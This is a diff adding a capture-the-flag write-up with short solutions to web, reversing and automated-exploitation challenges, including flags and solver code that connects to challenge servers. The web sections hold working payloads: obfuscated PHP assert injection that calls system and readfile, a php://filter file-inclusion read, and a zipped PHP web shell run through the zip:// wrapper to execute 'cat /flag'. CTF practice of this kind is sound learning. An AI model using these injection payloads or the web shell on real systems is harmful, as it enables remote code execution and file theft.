@@ -1,0 +1,271 @@
+~~~Web - Admin Panel 100~~~
+
+http://54.199.166.146/f31c286df3608f5b71ea528d7220974957bfb14d/panel.php
+
+HTTP/1.1 302 Found
+Date: Fri, 06 Jan 2017 11:01:56 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Location: ban.php
+Content-Length: 173
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel</title>
+</head>
+<body>
+Admin's secret is: CTF{Admin's_pane1_1s_0n_F1r3!?!?!}</body>
+</html>
+
+~~~End of block~~~
+
+~~~Web - Hello 200~~~
+
+view-source:http://54.199.166.146/258c634761ca928154687da257f68c5347ad68c3/?assert=printf("{%s}",("re"."adfi"."le")("fla"."g."."ph"."p"))
+view-source:http://54.199.166.146/258c634761ca928154687da257f68c5347ad68c3/?assert=printf("{%s}",("sy"."stem")("ls /"))
+view-source:http://54.199.166.146/258c634761ca928154687da257f68c5347ad68c3/?assert=("sys"."tem")("ls /")-printf("123")
+
+    assert(die(("re"."adfi"."le").("b.py")))
+    assert("printf('XD')")
+
+    function XD(){die("XD");}
+
+view-source:http://54.199.166.146/258c634761ca928154687da257f68c5347ad68c3/?assert=printf(%22{%22)-(%22var%22.chr(95).%22dump%22)((%22fop%22.%22en%22)(%22fla%22.%22g%22.%22.ph%22.%22p%22))-printf(%22}finish%22)
+    "file".chr(95)."get".chr(95)."contents"
+
+
+view-source:http://54.199.166.146/258c634761ca928154687da257f68c5347ad68c3/?assert=printf(%22{%22)-(%22var%22.chr(95).%22dump%22)((%22file%22.chr(95).%22get%22.chr(95).%22contents%22)(%22fla%22.%22g.%22.%22ph%22.%22p%22))-printf(%22}finish%22)
+
+~~~End of block~~~
+
+~~~Web - Snoopy's Pics 300~~~
+
+view-source:http://54.199.198.25/1e73b9bac0d4e522b0557fad209de3f9a8197bc4/?p=php://filter/convert.base64-encode/resource=index
+view-source:http://54.199.198.25/1e73b9bac0d4e522b0557fad209de3f9a8197bc4/?p=upload_snoopy
+zip a php file
+<?php
+    echo"hell0!";
+    ($_GET["run"])($_GET["code"]);
+?>
+upload it
+view-source:http://54.199.198.25/1e73b9bac0d4e522b0557fad209de3f9a8197bc4/?p=zip://images/lZXFTWCNY.jpg%23hack&run=system&code=cat%20/flag
+
+
+~~~Reverse - AHK 100~~~
+
+search "<COMPILER:" in the exe, then got this:
+a::04
+b::7f
+c::be
+d::37
+e::73
+f::29
+g::ff
+h::a5
+i::a9
+j::2c
+k::ef
+l::d1
+m::48
+n::22
+o::63
+p::5a
+q::fa
+r::32
+s::fa
+t::98
+u::3b
+v::cd
+w::25
+x::fb
+y::47
+z::d2
+0::05
+1::b5
+2::ba
+3::09
+4::e6
+5::77
+6::68
+7::56
+8::00
+9::15
+_::e4
+
+write a code to solve it:
+#include<bits/stdc++.h>
+using namespace std;
+map<string,char>mp;
+char in[1000];
+int main(){
+    for(int i=0;i<36;i++){
+        char a,b,c;
+        scanf("%c::%c%c\n",&a,&b,&c);
+        string ss;
+        ss+=b;ss+=c;
+        mp[ss]=a;
+        }{
+        char a,b,c;
+        scanf("%c::%c%c",&a,&b,&c);
+        string ss;
+        ss+=b;ss+=c;
+        mp[ss]=a;
+        }
+    scanf("%s",in);
+    int len=strlen(in);
+    for(int i=0;i<len;i+=2){
+        string ss;
+        ss+=in[i];ss+=in[i+1];
+        putchar(mp[ss]);
+        }
+    }
+enc: d105bee6d1e4fa983b37092298fae422090937e47fe6faa9bee45a05a92298fa
+result: l0c4l_stud3nts_n33d_b4sic_p0ints
+
+~~~End of block~~~
+
+~~~AEG - AlphaPuzzle 200~~~
+
+丟工作站用angr跑一跑
+import angr
+from pwn import *
+import base64
+import os
+print("start!")
+context.clear(arch = 'amd64')
+p = remote('133.130.124.59', 9991)
+
+for i in range(3):
+    p.recvuntil('base64')
+    elf = p.recvuntil('0th Piece', drop=True)
+    elf = bytearray(base64.b64decode(elf))
+    with open('elf2', 'wb') as f:
+        f.write(elf)
+    os.chmod('elf2', 0777)
+    a = angr.Project('elf2', load_options={"auto_load_libs": False})
+    cfg = a.analyses.CFG()
+    initial_state = a.factory.blank_state(addr=0x4008A9, add_options={'BYPASS_UNSUPPORTED_SYSCALL'})
+    pg = a.factory.path_group(initial_state, immutable=False)
+    a.hook(0x4008D0,nothing,length=5)
+    find_addrs = (0x400AF5, )
+    avoid_addrs = (0x400B06,0x400B1F,0x400921,0x400953,0x400972)
+    pg.explore(find=find_addrs, avoid=avoid_addrs )
+    print repr(pg.found[0].state.posix.dumps(0))
+    p.send(pg.found[0].state.posix.dumps(0))
+    
+p.interactive()
+
+~~~End of block~~~
+
+~~~Reverse - caitlyn 400~~~
+
+靠隊友發現是踩地雷，用C++隨便爆搜一下
+code:
+#include<bits/stdc++.h>
+#include"Jtol.h"
+using namespace Jtol;
+using namespace std;
+int mp[105][105];
+int cnt[105][105];
+int bom[105][105];
+char s[1000];
+string ss;
+int n;
+void add9(int x,int y){
+    bom[x][y]=1;
+    for(int i=max(x-1,0);i<=min(x+1,n-1);i++)
+        for(int j=max(y-1,0);j<=min(y+1,n-1);j++)
+            if(i!=x||j!=y)
+                cnt[i][j]++;
+    }
+void sub9(int x,int y){
+    bom[x][y]=0;
+    for(int i=max(x-1,0);i<=min(x+1,n-1);i++)
+        for(int j=max(y-1,0);j<=min(y+1,n-1);j++)
+            if(i!=x||j!=y)
+                cnt[i][j]--;
+    }
+inline bool chk(int x,int y){
+    if(!~mp[x][y]){
+        return bom[x][y]||cnt[x][y]==0;
+        }
+    return mp[x][y]==cnt[x][y];
+    }
+inline bool chk_low(int x,int y){
+    if(!~mp[x][y]){
+        return bom[x][y]||cnt[x][y]==0;
+        }
+    return mp[x][y]>=cnt[x][y];
+    }
+bool F(int x,int y){
+    if(y==n+1)return F(x+1,0);
+    if(x==n+1)return true;
+    if(x==n||y==n){
+        if(x&&y&&!chk(x-1,y-1))return false;
+        return F(x,y+1);
+        }
+    if(!(x&&y&&!chk(x-1,y-1)))
+        if(!(x&&!chk_low(x-1,y)))
+            if(!(y&&!chk_low(x,y-1)))
+                if(F(x,y+1))
+                    return true;
+    if(~mp[x][y])
+        return false;
+    //printf("%d %d\n",x,y);
+    add9(x,y);
+    if(!(x&&y&&!chk(x-1,y-1)))
+        if(!(x&&!chk_low(x-1,y)))
+            if(!(y&&!chk_low(x,y-1)))
+                if(F(x,y+1))return true;
+    sub9(x,y);
+    return false;
+    }
+int main(){
+    Net net=nc("140.113.209.24",10003,1);
+    auto &input=nc(net);
+    for(int k=0;k<9;k++){
+        Sleep(2000*(k+1));
+        fprintf(stderr,"~~%d~~\n",k);
+        input.mut.lock();
+        getline(input.stri,ss);
+        input.mut.unlock();
+        //gets(s);
+        stringstream str(ss);
+        n=0;
+        while(str>>s)n++;
+        for(int i=0;i<n;i++)
+            for(int j=-1;j<n;j++){
+                input>>s;
+                //scanf("%s",s);
+                if(j==-1)continue;
+                if(s[0]=='-')
+                    mp[i][j]=-1;
+                else
+                    mp[i][j]=s[0]-'0';
+                }
+        input.mut.lock();
+        getline(input.stri,ss);
+        input.mut.unlock();
+        memset(cnt,0,sizeof(cnt));
+        memset(bom,0,sizeof(bom));
+        if(!F(0,0))fprintf(stderr,"~~GG~~\n");
+        for(int i=0;i<n;i++,puts(""),NetSend(net,"\n"))
+            for(int j=0;j<n;j++)
+                if(bom[i][j])
+                    printf("-1 "),NetSend(net,"-1 ");
+                else if(~mp[i][j])
+                    printf("%2d ",mp[i][j]),NetSend(net," "+ToStr(mp[i][j])+" ");
+                else
+                    printf(" 0 "),NetSend(net," 0 ");
+        }
+    while(true)Sleep(100);
+    //while(gets(s))fprintf(stderr,"%s\n",s);
+    return 0;
+    }
+//Congraz! here is your flag: CTF{ZZZ_zzz_zZZ_Zzz_ZzZ_zZz_ZZz_zzZ}
+
+~~~End of block~~~
